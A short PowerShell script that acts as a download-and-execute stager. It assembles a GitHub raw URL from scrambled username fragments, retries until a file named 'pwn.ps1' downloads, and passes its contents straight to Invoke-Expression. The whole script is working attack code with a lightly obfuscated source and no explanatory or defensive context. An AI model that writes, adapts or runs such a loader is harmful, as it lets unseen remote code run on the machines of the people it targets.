Function getUrl($url){
  $web=[System.Net.WebRequest]::Create($url)
  try {
    $res=$web.GetResponse()
  }catch{}
  $stat=$res.StatusCode
  If($stat-eq200){
    return (New-Object System.IO.StreamReader ($res.GetResponseStream())).ReadToEnd()
  }Else{
    return $false
  }
}

function setUrl{
  ($url,$sub)=("", ("tf","air","ane"))
  for($i=0;$i-lt$sub.Length;$i++){
    $url+=$sub[(Get-Random -maximum $sub.Length)]
  }
  return "https://raw.githubusercontent.com/"+$url+"/Vectors/master/ps1/pwn.ps1"
}

Do{
  $url=(setUrl)
  write-host $url
}until(($c=getUrl($url)))
Invoke-Expression ($c)
